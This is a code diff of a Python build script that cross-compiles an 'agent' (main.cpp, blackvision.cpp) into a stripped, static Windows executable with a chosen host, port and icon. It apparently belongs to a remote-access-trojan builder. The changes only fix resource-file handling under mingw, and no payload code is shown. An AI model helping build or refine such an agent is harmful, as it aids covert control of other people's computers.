@@ -40,16 +40,20 @@ def rc_generate(filename, iconpath):
             print("Mingw is not properly installed or NOT availabe in PATH.")
             print("[-] Please install Mingw Compiler (http://www.mingw.org/)")
             showError("Built Failed!\nMingw is not properly installed or NOT availabe in PATH.\nPlease install Mingw Compiler (http://www.mingw.org/)")
+    else:
+        if(exeCheck("i686-w64-mingw32-windres") == True):
+            cmd = "i686-w64-mingw32-windres "+filename+".rc" +" -O coff -o "+filename+".res"
+            os.system(cmd)
 
 
+def generate(host, port, lfilename):
 
-def generate(host, port, filename):
-
+    filename = lfilename+".exe"
     if(os.name == "nt"):
         if(exeCheck("g++") == True):
             print("[+] Generating Executable..")
             # First Change Host and Port then continue
-            wincmd = "g++ agent/main.cpp agent/blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -lwinmm -static " +filename+".res"
+            wincmd = "g++ agent/main.cpp agent/blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -lwinmm -static " +lfilename+".res"
             os.system(wincmd)
             print("[+] File Compiled..")
             showInfo("Build succeeded!")
@@ -59,7 +63,7 @@ def generate(host, port, filename):
     else:
         if(exeCheck("i686-w64-mingw32-g++") == True):
             print("[+] Generating Executable..")
-            cmd = "i686-w64-mingw32-g++ agent/main.cpp agent/blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -lwinmm -static " +filename+".res"
+            cmd = "i686-w64-mingw32-g++ agent/main.cpp agent/blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -lwinmm -static " +lfilename+".res"
             os.system(cmd)
             print("[+] File Compiled..")
             showInfo("Build succeeded!")
